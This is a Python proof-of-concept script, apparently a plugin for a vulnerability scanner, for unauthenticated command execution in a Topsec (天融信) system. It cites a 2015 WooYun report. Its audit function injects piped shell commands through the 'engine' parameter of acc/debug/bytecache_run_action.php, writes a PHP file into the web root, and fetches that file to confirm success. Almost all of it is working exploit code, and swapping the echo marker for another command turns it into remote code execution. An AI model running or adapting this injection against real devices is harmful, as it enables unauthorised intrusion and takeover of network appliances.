#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信某系统前台无需登录命令执行3处
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0117621

setValue 方法 命令执行
stopByteCacheDebug 方法 命令执行
startByteCacheDebug 方法 命令执行
"""

import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):

    #setValue 方法 命令执行  #stopByteCacheDebug 方法 命令执行
    payload="acc/debug/bytecache_run_action.php?action=1&engine=%20|%20echo%20testvultest3%20>%20a.php%20|%20&ipfilter=10"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    payload='acc/debug/a.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvultest' in res:
        security_hole(target)
        return arg
    #startByteCacheDebug 方法 命令执行
    payload="acc/debug/bytecache_run_action.php?action=2&engine=%20|%20echo%20testvultest3%20>%20a1.php%20|%20&ipfilter=10"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    payload='acc/debug/a1.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvultest3' in res:
        security_hole(target)





        return arg
if __name__== '__main__':
    from dummy import *
